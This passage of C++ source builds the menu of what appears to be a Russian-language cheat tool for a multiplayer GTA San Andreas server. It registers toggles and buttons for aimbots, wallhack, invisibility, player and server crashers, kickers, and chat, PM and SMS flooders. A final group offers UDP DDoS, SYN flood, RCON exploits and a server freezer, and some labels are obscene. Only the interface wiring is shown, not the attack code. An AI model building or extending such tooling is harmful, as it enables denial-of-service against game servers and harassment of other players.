		x, menu_background->red, menu_background->green, menu_background->blue, iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);
	 
	 
	////////////////////////////////////////  
	TwAddButton(twBar_Testing1, "Сайт разработчика", nrg109, NULL, " group='Разные операции' ");
	TwAddButton(twBar_Testing1, "ВК Разработчика", nrg109da, NULL, " group='Разные операции' ");
	TwAddButton(twBar_Testing1, "Важная информация", nrg1601qqx22, NULL, " group='Разные операции' "); 
	TwAddButton(twBar_Testing1, "Книга хакинга", nrg1601, NULL, " group='Разные операции' ");
	TwAddButton(twBar_Testing1, "Команды Дрифтюлекса", nrg1601q, NULL, " group='Разные операции' ");
	TwAddVarRW(twBar_Testing1, "Инфо Бар", TW_TYPE_BOOLCPP, &cheat_state->_generic.infobar, " group='Разные операции' ");
	TwAddVarRW(twBar_Testing1, "Админы Онлайн", TW_TYPE_BOOLCPP, &cheat_state->_generic.pAAA, " group='Разные операции' ");
	TwAddVarRW(twBar_Testing1, "Информация об Обьектах, Пикапах, Машинах", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickm21ss, " group='Разные операции' ");
	
	
	//TwAddVarRW(twBar_Testing1, "АнтиСлежка", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh1ggd3ssssdfdffd, " group='Разные операции' ");
	//TwAddVarRW(twBar_Testing1, "sdsdsdsd", TW_TYPE_BOOLCPP, &cheat_state->_generic.invalid_ai, " group='Разные операции' ");
	
	//TwAddButton(twBar_Testing1, "Крашер Водителей", afkaJami81, NULL, " group='Разные операции' ");
		
	//TwAddVarRW(twBar_Testing1, "выыввывы", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasdddasas131112dssdz1dffdf, " group='Разные операции' ");

	TwAddVarRW(twBar_Testing1, "График онлайна", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z111111vv, " group='Разные операции' ");
	TwAddButton(twBar_Testing1, "Рестарт модема(SimCard modem)", asassasa, NULL, " group='Разные операции' ");
	TwAddButton(twBar_Testing1, "Выход на сетевой уровень", nrg1, NULL, " group='Разные операции' ");
	TwAddButton(twBar_Testing1, "Стиллер обьектов", nrg160211ws, NULL, " group='Разные операции' ");
	TwAddButton(twBar_Testing1, "Сменить ник", nrg1601ws, NULL, " group='Nick_Changer' ");
	TwAddVarRW(twBar_Testing1, "Ник", TW_TYPE_CSSTRING(sizeof(set.flooder123[0])), &set.flooder123[0], " 'group='Nick_Changer' group='Nick' ");
	TwAddButton(twBar_Testing1, "Коннект к скайпу", nrg15, NULL, " group='Skype_Z0R' ");
	TwAddButton(twBar_Testing1, "Справочник", nrg160, NULL, " group='Skype_Z0R' ");
	TwAddButton(twBar_Testing1, "Отправить сообщение", nrg16, NULL, " group='Skype_Message' "); 
	TwAddVarRW(twBar_Testing1, "Логин", TW_TYPE_CSSTRING(sizeof(set.flooder1[0])), &set.flooder1[0], " 'group='Skype_Message' group='Login_Skype' ");
	TwAddVarRW(twBar_Testing1, "Сообщение", TW_TYPE_CSSTRING(sizeof(set.flooder2[0])), &set.flooder2[0], " 'group='Skype_Message' group='Message_Skype' ");
	//////////////////////////////////////
	TwAddVarRW(twBar_Testing2, "Пиздорванка", TW_TYPE_BOOLCPP, &cheat_state->_generic.carspam, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Петушилка", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsddllserer, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Супер GM", TW_TYPE_BOOLCPP, &cheat_state->_generic.jos, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "WallHack", TW_TYPE_BOOLCPP, &set.chams_on, " group='Пешие операции' ");
	TwAddButton(twBar_Testing2, "000Крашер", dfsddsdsdf, NULL, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Обсиратель киллеров", TW_TYPE_BOOLCPP, &cheat_state->_generic.pAAAsSA1ds, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Double Gun(Deagle&Shotgun)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas15, " group='Пешие операции' "); 
	TwAddVarRW(twBar_Testing2, "Мощный Миниган", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas5, " group='Пешие операции' "); 
	TwAddVarRW(twBar_Testing2, "Аниматор", TW_TYPE_BOOLCPP, &cheat_state->_generic.sdsdsdsdsdssdsd, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "CrazyTeleport", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Дамагер(Приват)", TW_TYPE_BOOLCPP, &cheat_state->_generic.gfgfgffgfg454rtff, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Авто +С(Новый)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsddllseredsr, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Авто +C", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas6, " group='Пешие операции' ");
	//TwAddVarRW(twBar_Testing2, "Freezer by B1t", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17b, " group='Пешие операции' ");
	//TwAddVarRW(twBar_Testing2, "Freezer by B1t v2", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17bb, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Ultra Crasher", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17bbb, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Рапид", TW_TYPE_BOOLCPP, &cheat_state->_generic.passenger_crasher_enable, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Скорость рапида", TW_TYPE_FLOAT, &set.rapid_speed, " group='Пешие операции' ");
	TwAddButton(twBar_Testing2, "Кикер(клавиша N)", afkaJami, NULL, " group='Пешие операции' ");
	TwAddButton(twBar_Testing2, "ЛагоДамагер(ФейкБазука)", afkaJami7, NULL, " group='Пешие операции' ");
	TwAddButton(twBar_Testing2, "Кикер 2(клавиша N)", afkaJami8, NULL, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Быстрое убийство", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas10, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Дамагер гранатами", TW_TYPE_BOOLCPP, &cheat_state->_generic.sdsddsds7ds6sd6ds6ds, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Пернональный флудер киллчата", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasdddasas131112z111m, " group='Пешие операции' ");
	TwAddButton(twBar_Testing2, "Бот грузчик ДМ(4000 мешков в мин)", afkaJagk, NULL, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "АвтоЭлеватор(Аналог для ДМ)", TW_TYPE_BOOLCPP, &cheat_state->_generic.pAAAfdfdfderer, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "АвтоЭлеватор(Аналог для РП)", TW_TYPE_BOOLCPP, &cheat_state->_generic.pAAAfdfdfd, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Быстрое убийство v2", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss2432ersasarejj, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Флуд смертями", TW_TYPE_BOOLCPP, &cheat_state->_generic.log_packet_send, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Ходьба на голове", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas18, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Флуд коннектом", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickm2161, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Ебарь", TW_TYPE_BOOLCPP, &cheat_state->_generic.vehcomponentcrasher, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Ебарь v2", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas13111, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Крашер кулаком(ЛКМ+ПКМ)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas16, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Крашер кулаком v2(ЛКМ+ПКМ)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "FakeDisconnector", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas10mm, " group='Пешие операции' ");
	TwAddButton(twBar_Testing2, "АнтиРазброс пуль", afkaJagkldfdf, NULL, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Пульсатор Ночь/Тепло виденье", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas, " group='Пешие операции' "); 
	TwAddVarRW(twBar_Testing2, "Брейкданс пешком", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas1, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Крашер пешком(Tun)", TW_TYPE_BOOLCPP, &cheat_state->_generic.vehcomponentcrasher21, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Рандом флуд/чат", TW_TYPE_BOOLCPP, &cheat_state->_generic.skin_changer, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Флуд в PM", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss2432, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Флуд SMS", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss2432erre, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Toggle OnFoot PlayerLoading(LKM)", TW_TYPE_BOOLCPP, &cheat_state->_generic.playerbugger_onfoot, " group='PlayerLoading' ");
	TwAddVarRW(twBar_Testing2, "PlayerID", TW_TYPE_INT32, &cheat_state->_generic.playerbugger_onfoot_targetid, " group='PlayerLoading' ");
	TwAddVarRW(twBar_Testing2, "Toggle OnFoot PlayerSlaper(LKM)", TW_TYPE_BOOLCPP, &cheat_state->_generic.playerbugger_onfoots, " group='Slaper' ");
	TwAddVarRW(twBar_Testing2, "PlayerID Slap", TW_TYPE_INT32, &cheat_state->_generic.playerbugger_onfoot_targetids, " group='Slaper' ");
	TwAddVarRW(twBar_Testing2, "Toggle OnFoot NewPlayerLoading(LKM)", TW_TYPE_BOOLCPP, &cheat_state->_generic.playerbugger_onfootc, " group='NewPlayerLoading' ");
	TwAddVarRW(twBar_Testing2, "PlayerID New", TW_TYPE_INT32, &cheat_state->_generic.playerbugger_onfoot_targetidc, " group='NewPlayerLoading' ");
	TwAddVarRW(twBar_Testing2, "Обычный АимБот", TW_TYPE_BOOLCPP, &cheat_state->_generic.AimbotToggle, " group='Aimbot' ");
	TwAddVarRW(twBar_Testing2, "Скин АимБот", TW_TYPE_BOOLCPP, &cheat_state->_generic.skinAimbot, " group='Aimbot' ");
	TwAddVarRW(twBar_Testing2, "Машина АимБот", TW_TYPE_BOOLCPP, &cheat_state->_generic.carAimbot, " group='Aimbot' ");
	TwAddVarRW(twBar_Testing2, "Снайпер АимБот", TW_TYPE_BOOLCPP, &cheat_state->_generic.sniperAimbot, " group='Aimbot' ");
	TwAddVarRW(twBar_Testing2, "EX MODE", TW_TYPE_BOOLCPP, &cheat_state->_generic.silentAimbot, " group='Aimbot' ");
	TwAddVarRW(twBar_Testing2, "EX xOffset", TW_TYPE_FLOAT, &cheat_state->_generic.silentFrameX, " group='Aimbot' min=0.0 max=0.5 step=0.001 ");
	TwAddVarRW(twBar_Testing2, "EX yOffset", TW_TYPE_FLOAT, &cheat_state->_generic.silentFrameY, " group='Aimbot' min=0.0 max=0.5 step=0.001 ");
	TwAddVarRW(twBar_Testing2, "EX frame show", TW_TYPE_BOOLCPP, &cheat_state->_generic.silentFrame, " group='Aimbot' ");
	TwAddVarRW(twBar_Testing2, "Флуд Никами", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh2, " group='Пешие операции' ");
	TwAddButton(twBar_Testing2, "АнтиАФК", afka, NULL, "group='Пешие операции' ");
	TwAddButton(twBar_Testing2, "АнтиАФКПро(Свернутый режим)", func_aafk, NULL, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Крашер оружием v2", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Быстрый бег/стрельба/езда", TW_TYPE_BOOLCPP, &cheat_state->_generic.pic, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Фейковые лаги для тащеров", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z1111, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "InvalidAimz", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss2432erreqwer, " group='Пешие операции' ");
	 TwAddVarRW(twBar_Testing2, "RemovePlayerCrasher", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss2432erreqwe, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Деформер", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z11111, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Пульсатор ХП", TW_TYPE_BOOLCPP, &cheat_state->_generic.pulsedweapon, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Флуд пикапами", TW_TYPE_BOOLCPP, &cheat_state->_generic.pAAAsSA1, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Режим балерины", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas2, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Крашер оружием", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas4, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Невидимка(Noob)", TW_TYPE_BOOLCPP, &cheat_state->_generic.respavner, " group='Пешие операции' ");
	TwAddButton(twBar_Testing2, "Невидимка на спектаторе", nrg160211ssssaws, NULL, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Невидимка PRO", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssssv, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Невидимка v2(Приват)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasdddasas131112z1dffdf, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Невидимка(Приват)", TW_TYPE_BOOLCPP, &cheat_state->_generic.dssdsdsdsd23sasa23, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Фейковый коннектор", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickmaaaa, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Кривая анимация", TW_TYPE_BOOLCPP, &cheat_state->_generic.vehcomponentcrasher1, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Еблуша", TW_TYPE_BOOLCPP, &cheat_state->_generic.vehcomponentcrasher2, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Дайв бай", TW_TYPE_BOOLCPP, &cheat_state->_generic.dri, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Фейк килл", TW_TYPE_BOOLCPP, &cheat_state->_generic.fake, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Серфер(Рекомендуется GM)", TW_TYPE_BOOLCPP, &cheat_state->actor.surfer_on, " group='Пешие операции' ");
	TwAddVarRW(twBar_Testing2, "Флудер", TW_TYPE_BOOLCPP, &cheat_state->_generic.gggg, " group='ChatFlooder' ");
	TwAddVarRW(twBar_Testing2, "Сообщение", TW_TYPE_CSSTRING(sizeof(set.flooder[0])), &set.flooder[0], " 'group='ChatFlooder' group='FlooderText' ");
	///////////////////////////////
	TwAddVarRW(twBar_Testing3, "Пульсатор цветами", TW_TYPE_BOOLCPP, &cheat_state->_generic.pulsedisk, " group='Автомобильные операции' "); 
	TwAddVarRW(twBar_Testing3, "Байк крашер", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickm13, " group='Автомобильные операции' ");
	TwAddButton(twBar_Testing3, "Невидимый инфернус(Fake)", nrg228, NULL, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Флуд винилами", TW_TYPE_BOOLCPP, &cheat_state->_generic.qqqq, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Эпик Крашер(NoobDay)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss4343, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Эпик Крашер v2(кнопка F и F)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss2432ersasare, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Эпик Крашер v3(5day)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss2432ersasarebb, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Эпик Крашер v4(кнопка F и F)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss2432ersasarebbf, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Эпик Крашер v5(2day drace)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas10mq, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Эпик Крашер v6(Owner кнопка F и F)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas4l22, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Эпик Крашер v7(Owner автоматика)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas4l221, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Эпик Крашер v8(Owner автоматика)", TW_TYPE_BOOLCPP, &cheat_state->_generic.dssdsdsdsd2323, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "ЛоадКрашер(Массовый)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z111m, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "ЛоадКрашер v2(Юзать с каршотом)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z111mm, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Удалятор ПРО", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z111mmm, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Пиздорванка", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickm2, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Лаггер", TW_TYPE_BOOLCPP, &cheat_state->_generic.spawner, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "АвтоЭлеватор(Аналог для РП)", TW_TYPE_BOOLCPP, &cheat_state->_generic.pAAAsSA1hjjhjj, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "АвтоЭлеватор(Аналог для РП)(приват)", TW_TYPE_BOOLCPP, &cheat_state->_generic.pAAAsSA1hjjhjjdfdf, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "ЛаггерПРО(PSync)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsddllsdssdere121EWWEEW2r, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "ЛаггерПРО(USync)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsddllsdssdere1212r, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Удалятор 2000(USync)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsddllsdssdere1212rerer, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "АвтоСлаппер", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickmaa, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Петушилка", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsddllsere1212r, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "АвтоТроль v3", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsddserer4554, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Лаггер на ближайшего игрока", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsddserer, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Выдача золого дождя(Приват)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsdds, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Выдача золого дождя(Приват)(PSync)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsddsbbbb, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Невидимка", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssssv1, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Респавнер машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickm216, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Пульсатор дисками", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Клоака Крашер", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z111dsasdfdfdfd, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Граббер машин(по всей карте)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z111mmmm, " group='Автомобильные операции' ");
	TwAddButton(twBar_Testing3, "АвтоПарковщик ТС", afkaJagkl, NULL, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Брейкданс хак", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas3, " group='Автомобильные операции' ");  
	TwAddVarRW(twBar_Testing3, "Дрифт контролер", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas14, " group='Автомобильные операции' "); 
	TwAddVarRW(twBar_Testing3, "Дамаг флуд", TW_TYPE_BOOLCPP, &cheat_state->_generic.fake120, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Гипер Крашер(RP)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas11, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Крашер тюнингом", TW_TYPE_BOOLCPP, &cheat_state->_generic.crasher, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Дрифт хак", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas8, " group='Автомобильные операции' ");  
	TwAddVarRW(twBar_Testing3, "Гипер Крашер(Drift&DM)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z111111, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Кар Дристер", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas13, " group='Автомобильные операции' "); 
	TwAddVarRW(twBar_Testing3, "Сумашедшая сирена", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas4l, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Массовый дамаг машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas4l1, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "W/P Крашер", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas10m, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "CrazyTeleport", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas1311, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Деформер(ЛКМ)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas19, " group='Автомобильные операции' "); 
	TwAddVarRW(twBar_Testing3, "Tank/Hydra/S.W.A.T. Attacker", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas4l2, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Грузин Крашер(Приват Эдишан)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z111dsasd, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Езда на крыше", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas20, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Удалить все тачки", TW_TYPE_BOOLCPP, &cheat_state->_generic.lag, " group='Автомобильные операции' " );
	TwAddVarRW(twBar_Testing3, "Массовый поджог машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.pAAAs, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Троллинг машинами", TW_TYPE_BOOLCPP, &cheat_state->_generic.pAAAsSA, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Горящая машина", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas7, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Бешаный сигнал", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas12, " group='Автомобильные операции' ");  
	TwAddVarRW(twBar_Testing3, "InCarPlayerLoading", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickm, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Брейкданс в машине", TW_TYPE_BOOLCPP, &cheat_state->_generic.log_packet_recv, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Поджог машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickm1, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Полет на машине", TW_TYPE_BOOLCPP, &cheat_state->_generic.lags, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Снег из машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickmaaaas, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Ураган из машин(Mutant Sync)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z111111vvqqq, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Стена из машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh1, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Стрельба машинами(ЛКМ)", TW_TYPE_BOOLCPP, &cheat_state->_generic.grt, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Стрельба машинами(ЛКМ PSunc)", TW_TYPE_BOOLCPP, &cheat_state->_generic.grtrtrt4554, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Лаггер(TSunc)", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas17sdsddllsdssdeWEWEre121EWWEEW2r, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Стрельба машинами(ЛКМ CSSunc)", TW_TYPE_BOOLCPP, &cheat_state->_generic.grtrtrt455dsds4, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Массовый КарДжекинг", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss2432erreqw, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Небо из машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.deathb, " group='Автомобильные операции' ");
	TwAddButton(twBar_Testing3, "Управлять чужим авто", nrg160211ssssawsxx, NULL, " group='Автомобильные операции' "); 
	TwAddVarRW(twBar_Testing3, "АвтоТроль", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "АвтоТроль v2", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Круг из машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z1, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Разброс машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z11, " group='Автомобильные операции' ");
	TwAddVarRW(twBar_Testing3, "Перекраска машин", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas131112z111, " group='Автомобильные операции' ");
	///////////////////////////
	TwAddVarRW(twBar_Testing4, "UDP ДДоС", TW_TYPE_BOOLCPP, &cheat_state->_generic.ddos, " group='Пакетные операции' ");
	TwAddVarRW(twBar_Testing4, "Ркон эксплоиты", TW_TYPE_BOOLCPP, &cheat_state->_generic.rcon, " group='Пакетные операции' ");
	TwAddVarRW(twBar_Testing4, "Массовые лаги", TW_TYPE_BOOLCPP, &cheat_state->_generic.cccc, " group='Пакетные операции' ");
	TwAddVarRW(twBar_Testing4, "МультиДДоС", TW_TYPE_BOOLCPP, &cheat_state->_generic.ffff, " group='Пакетные операции' ");
	TwAddButton(twBar_Testing4, "Сервер Фризер", nrg3, NULL, " group='Пакетные операции' ");
	TwAddButton(twBar_Testing4, "SYN Flood", pmflooderw, NULL, " group='Пакетные операции' "); 
	TwAddButton(twBar_Testing4, "STORM SYN Flood", pmflooderwaa, NULL, " group='Пакетные операции' ");
	TwAddButton(twBar_Testing4, "Папа Коля ДДоС xD", pmflooderw1, NULL, " group='Пакетные операции' ");
	TwAddVarRW(twBar_Testing4, "Ркон Крашер", TW_TYPE_BOOLCPP, &cheat_state->_generic.bikecrasher, " group='Пакетные операции' ");
	TwAddVarRW(twBar_Testing4, "Ркон Флудер", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssss, " group='Пакетные операции' ");
	TwAddButton(twBar_Testing4, "BAD RCON ATTEMPT", afkaJ, NULL, " group='Пакетные операции' ");
	TwAddButton(twBar_Testing4, "Инкоминг DDoS(робит на порту 7777)", afkaJa, NULL, " group='Пакетные операции' ");
	TwAddButton(twBar_Testing4, "Аналог СампСТ", afkaJaa, NULL, " group='Пакетные операции' ");
